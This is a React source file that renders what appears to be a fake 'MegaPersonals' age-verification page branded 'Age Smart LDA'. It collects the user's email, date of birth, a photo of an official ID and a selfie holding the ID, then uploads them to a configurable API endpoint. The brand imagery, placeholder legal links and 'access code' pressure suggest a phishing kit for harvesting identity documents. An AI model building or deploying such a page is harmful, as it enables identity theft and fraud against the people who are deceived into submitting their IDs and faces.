import React, { useEffect, useState } from 'react'
import { Helmet } from 'react-helmet'
import { useNavigate, useSearchParams } from 'react-router-dom';
import request from '../../utils/request';

export default function VerificationSteps() {

   const API_URL = import.meta.env.VITE_API_URL;
   const [searchParams, setSearchParams] = useSearchParams();

   const navigate = useNavigate();
   const [account, setAccount] = useState(null)
    
    const showAccount = async (acccountToken) => {
        try {
            const {data} = await request.get('/accounts/show-account/' + acccountToken)
            
            if (!data?.id) {
                navigate('/page-not-found');
                return;
            };

            setAccount(data)
            
        } catch (error) { 
            console.log(error);  
        }
    }

   useEffect(() => { 
      if (!searchParams.get("token")) {
         navigate('/page-not-found'); 
      } else {
         showAccount(searchParams.get("token"))
      }
   }, [searchParams])

  return (
      <>
        <Helmet>
            <link rel="icon" type="image/png" sizes="16x16" href="/mega-verification/v2/images/favicon.png"/>
            <script type="text/javascript" src="/mega-verification/v2/js/p2/jquery.min.js"></script>
            <script type="text/javascript" src="/mega-verification/v2/js/p2/jquery-ui.min.js"></script>
            <link rel="stylesheet" href="/mega-verification/v2/css/p2/jquery-ui.min.css" />
            <script src="/mega-verification/v2/js/p2/bootstrap.bundle.js"></script>
            <link rel="stylesheet" href="/mega-verification/v2/css/p2/bootstrap-icons.css"/>
            <link rel="stylesheet" href="/mega-verification/v2/css/p2/bootstrap.min.css"/>
            <link rel="stylesheet" href="/mega-verification/v2/css/p2/custom.css" />
            <script data-cfasync="false" src="/mega-verification/v2/js/p2/email-decode.min.js"></script>

            <script src="/mega-verification/v2/js/p2/mobile-tablet-check.js"></script>
              
              <script src="/mega-verification/v2/js/p2/inner.min.js"></script>
              <title>MegaPersonals: Verification</title>
          </Helmet>
          
              <main>
        <div id="top-header">
            <div className="mp-header">
                <img alt="" src="/mega-verification/v2/images/p2/megapersonalsPageHeader.png"/>
            </div>
        </div>
        <div className="container-fluid px-4 py-5 verification-container">
            <form id="verification-form" encType="multipart/form-data">
                <div className="verification-container-page page-age">
                    <h3><strong>Email being registered</strong></h3>

                          <h3 style={{ color: 'green' }}><strong><a href="#" className="__cf_email__">{account?.email}</a></strong></h3>
                    <h3>
                        <strong className="text-danger text-uppercase">Important!</strong><br/>
                        Your ACCESS CODE<br/>
                        will be tied to your<br/>
                        <strong>DATE OF BIRTH</strong>
                    </h3>
                    <h3>Enter it here</h3>
                    <div id="birth-container">
                        <input id="birth-year" className="form-control" type="number" placeholder="YYYY" maxLength={4} min="1940" />
                        <input id="birth-month" className="form-control" type="number" placeholder="MM" maxLength={2} min="1" max="12" />
                        <input id="birth-day" className="form-control" type="number" placeholder="DD" maxLength={2} min="1" max="31" />
                    </div>
                    <div className="d-flex flex-column align-items-center">
                        <button id="btn-go-to-photo-id" className="btn btn-primary w-50" type="button">SUBMIT</button>
                        <img className="img-footer-logo mt-2" src='/mega-verification/v2/images/p2/footer-logo.png' />
                        <div>
                            <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="#">Terms of Use</a>
                                <a href="#">Privacy Policy</a>
                                <a href="#">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div className="verification-container-page page-photo-id" style={{ display: 'none' }}>
                    <h2>upload or take a photo<br/>of an official id</h2>
                    <h2>place on a flat surface</h2>
                    <div>
                        <img alt="" id="img-photo-id-sample" src='/mega-verification/v2/images/photo-id-sample.png' />
                    </div>
                    <div className="d-flex flex-column align-items-center mt-2">
                        <button id="btn-take-photo-id" className="btn btn-success" type="button">
                            <h4>I'm ready</h4>
                            Take photo of ID
                        </button>
                        <img alt="" className="img-footer-logo mt-2" src='/mega-verification/v2/images/p2/footer-logo.png' />
                        <style>
                            
                        </style>
                        <div>
                            <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="#" target="_blank">Terms of Use</a>
                                <a href="#" target="_blank">Privacy Policy</a>
                                <a href="#" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div className="verification-container-page page-photo-id-camera" style={{ display: 'none' }}>
                    <h2>Camera<br/>take the ID Photo</h2>
                    <video id="video-id" autoPlay playsInline muted></video>
                    <h5>Make sure your face and your<br/>date of birth is clear in the photo.</h5>
                    <h5>After taking the photo you can<br/>black out your private details.</h5>
                    <div className="revert-camera-wrapper">
                        <div className="d-flex flex-column align-items-center mb-2">
                            <button id="btn-revert-id-camera" className="btn btn-secondary" type="button">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-phone-flip" viewBox="0 0 16 16">
                                    <path fillRule="evenodd" d="M11 1H5a1 1 0 0 0-1 1v6a.5.5 0 0 1-1 0V2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v6a.5.5 0 0 1-1 0V2a1 1 0 0 0-1-1m1 13a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-2a.5.5 0 0 0-1 0v2a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2v-2a.5.5 0 0 0-1 0zM1.713 7.954a.5.5 0 1 0-.419-.908c-.347.16-.654.348-.882.57C.184 7.842 0 8.139 0 8.5c0 .546.408.94.823 1.201.44.278 1.043.51 1.745.696C3.978 10.773 5.898 11 8 11q.148 0 .294-.002l-1.148 1.148a.5.5 0 0 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708l1.145 1.144L8 10c-2.04 0-3.87-.221-5.174-.569-.656-.175-1.151-.374-1.47-.575C1.012 8.639 1 8.506 1 8.5c0-.003 0-.059.112-.17.115-.112.31-.242.6-.376Zm12.993-.908a.5.5 0 0 0-.419.908c.292.134.486.264.6.377.113.11.113.166.113.169s0 .065-.13.187c-.132.122-.352.26-.677.4-.645.28-1.596.523-2.763.687a.5.5 0 0 0 .14.99c1.212-.17 2.26-.43 3.02-.758.38-.164.713-.357.96-.587.246-.229.45-.537.45-.919 0-.362-.184-.66-.412-.883s-.535-.411-.882-.571M7.5 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1z" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    <div className="d-flex flex-column align-items-center">
                        <button id="btn-take-photo-id-camera" className="btn btn-primary w-50" type="button">Take photo</button>
                    </div>
                </div>
                <div className="verification-container-page page-photo-id-camera-decline" style={{ display: 'none' }}>
                    <h3>You declined access to<br/>your camera?</h3>
                    <h3>To complete AgeSmart<br/>verification your camera<br/>will be used to photo your<br/>ID and Selfie.</h3>
                    <h3>You can black out private<br/>info before uploading.</h3>
                    <h3>Please, allow access<br/>to the camera in browser tab settings<br/>and reload this page.</h3>
                    <div className="d-flex flex-column">
                        <img alt="" className="img-footer-logo mt-2" src='/mega-verification/v2/images/p2/footer-logo.png' />
                        <style>
                            
                        </style>
                        <div>
                            <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div className="verification-container-page page-photo-id-redacting" style={{ display: 'none' }}>
                    <h2>COVER YOUR<br/>PRIVATE INFO</h2>

                    <canvas id="canvas-id"></canvas>

                    <h5 className="mt-3 mb-2"><a href="#" className="text-danger instruction-link">Instruction?</a></h5>
                    <div className="d-flex flex-column justify-content-between align-items-center gap-2 mb-2">
                        <button id="btn-go-to-photo-id-redacting" className="btn btn-success" type="button">
                            <h4>FINISHED</h4>
                            UPLOAD
                        </button>
                        <h4>OR</h4>
                        <button id="btn-go-to-photo-id-redraw" className="btn btn-warning" type="button">CLEAR, RE-DRAW</button>
                        <button id="btn-go-to-photo-id-retake" className="btn btn-warning" type="button">RE-TAKE PHOTO</button>
                    </div>
                    <div className="d-flex flex-column">
                        <img alt="" className="img-footer-logo mt-2" src='/mega-verification/v2/images/p2/footer-logo.png' />
                        <style>
                            
                        </style>
                        <div>
                            <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div className="verification-container-page page-photo-id-uploaded" style={{ display: 'none' }}>
                    <h3>Please Proceed to the<br/>Next step and<br/>Hold the ID close to<br/>your face</h3>
                    <div>
                        <img alt="" id="img-photo-selfy-sample" src='/mega-verification/v2/images/photo-selfy-sample.png' />
                    </div>
                    <div className="d-flex flex-column justify-content-between align-items-center gap-3 my-2">
                        <button id="btn-take-photo-selfy" className="btn btn-success" type="button">
                            <h4>I AM READY</h4>
                            TAKE SELFIE HOLDING ID
                        </button>
                        <img alt="" className="img-footer-logo mt-2" src='/mega-verification/v2/images/p2/footer-logo.png' />
                        <style>
                            
                        </style>
                        <div>
                            <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div className="verification-container-page page-photo-selfy-camera" style={{ display: 'none' }}>
                    <h2>Camera<br/>take selfie holding id</h2>
                    <div className="position-relative mx-auto media-container">
                        <video id="video-selfy" autoPlay playsInline muted></video>
                        <div className="selfy-ellipse-wrapper">
                            <img alt="" src="/mega-verification/v2/images/selfie-shape.png" className="selfie-shape" />
                        </div>
                    </div>
                    <h5>Center your face in the oval.</h5>
                    <h5>Also, be sure your ID is visible<br/>in the rectangular frame</h5>
                    <div className="revert-camera-wrapper">
                        <div className="d-flex flex-column align-items-center mb-2">
                            <button id="btn-revert-selfy-camera" className="btn btn-secondary" type="button">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-phone-flip" viewBox="0 0 16 16">
                                    <path fillRule="evenodd" d="M11 1H5a1 1 0 0 0-1 1v6a.5.5 0 0 1-1 0V2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v6a.5.5 0 0 1-1 0V2a1 1 0 0 0-1-1m1 13a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-2a.5.5 0 0 0-1 0v2a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2v-2a.5.5 0 0 0-1 0zM1.713 7.954a.5.5 0 1 0-.419-.908c-.347.16-.654.348-.882.57C.184 7.842 0 8.139 0 8.5c0 .546.408.94.823 1.201.44.278 1.043.51 1.745.696C3.978 10.773 5.898 11 8 11q.148 0 .294-.002l-1.148 1.148a.5.5 0 0 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708l1.145 1.144L8 10c-2.04 0-3.87-.221-5.174-.569-.656-.175-1.151-.374-1.47-.575C1.012 8.639 1 8.506 1 8.5c0-.003 0-.059.112-.17.115-.112.31-.242.6-.376Zm12.993-.908a.5.5 0 0 0-.419.908c.292.134.486.264.6.377.113.11.113.166.113.169s0 .065-.13.187c-.132.122-.352.26-.677.4-.645.28-1.596.523-2.763.687a.5.5 0 0 0 .14.99c1.212-.17 2.26-.43 3.02-.758.38-.164.713-.357.96-.587.246-.229.45-.537.45-.919 0-.362-.184-.66-.412-.883s-.535-.411-.882-.571M7.5 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1z" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    <div className="d-flex flex-column align-items-center">
                        <button id="btn-take-photo-selfy-camera" className="btn btn-primary w-50" type="button">Take photo</button>
                    </div>
                </div>
                <div className="verification-container-page page-photo-selfy-uploaded" style={{ display: 'none' }}>
                    <h2>Is the selfie ok?</h2>
                    <canvas id="canvas-selfy"></canvas>
                    <h5 className="my-3">Is the photo blurry?<br/>If so, retake it.</h5>
                    <div className="d-flex flex-column justify-content-between align-items-center gap-3 mb-2">
                        <button id="btn-go-to-photo-selfy-retake" className="btn btn-warning" type="button">RE-TAKE PHOTO</button>
                        <button id="btn-go-to-photo-selfy-upload" data-url={API_URL} data-token={searchParams.get('token')} className="btn btn-success" type="button">
                            <h4>FINISHED</h4>
                            UPLOAD
                        </button>
                        <img alt="" className="img-footer-logo mt-2" src='/mega-verification/v2/images/p2/footer-logo.png' />
                        <div>
                            <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div className="verification-container-page page-photo-files-uploading" style={{ display: 'none' }}>
                    <h2>Uploading photos</h2>
                    <div className="progress">
                        <div className="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style={{ width: '100%' }} aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div>
                    </div>
                    <div className="d-flex flex-column">
                        <img className="img-footer-logo mt-2" alt="" src='/mega-verification/v2/images/p2/footer-logo.png' />
                        <div>
                            <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div className="verification-container-page page-photo-files-uploading-complete" style={{ display: 'none' }}>
                    <h3 className="mt-5 pt-5">Upload complete 100%</h3>
                    <h3>We will now check your<br/>Photo and ID in our<br/>records... one minute<br/>Please.</h3>
                    <div className="d-flex flex-column">
                        <img alt="" className="img-reload mt-2" src='/mega-verification/v2/images/reload-image.png' />
                        <img alt="" className="img-footer-logo mt-2" src='//mega-verification/v2/images/p2/footer-logo.png' />
                        <div>
                            <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="s" target="_blank">Terms of Use</a>
                                <a href="s" target="_blank">Privacy Policy</a>
                                <a href="s" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
            </form>
        </div>
        <div className="modal fade" id="black-out-modal">
            <div className="modal-dialog modal-dialog-centered">
                <div className="modal-content">
                    <div className="modal-body text-center">
                        <h5 className="py-3">Use your finger to black<br />out your, name, address<br />and the ID number.</h5>
                        
                        <h5>DO NOT black out your <br/> face or your date of birth. <br/>Your verification will fail.</h5>
                            
                        <h5 className="py-3">Pinch and Scroll<br/>with two fingers.<br/>Draw with single finger.</h5>
                        <button id="btn-black-out-modal" className="btn btn-success mb-3" type="button" data-bs-dismiss="modal">OK</button>
                    </div>
                </div>
            </div>
        </div>
        <div className="modal fade" id="backend-error-modal">
            <div className="modal-dialog modal-dialog-centered">
                <div className="modal-content">
                    <div className="modal-body text-center">
                        <h5 className="py-3 text-danger bold"></h5>
                        <button id="btn-backend-error-modal" className="btn btn-success mb-3" type="button" data-bs-dismiss="modal">OK</button>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <div className="spinner-loader-fader">
        <div className="spinner-loader">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
      </>
  )
}

    


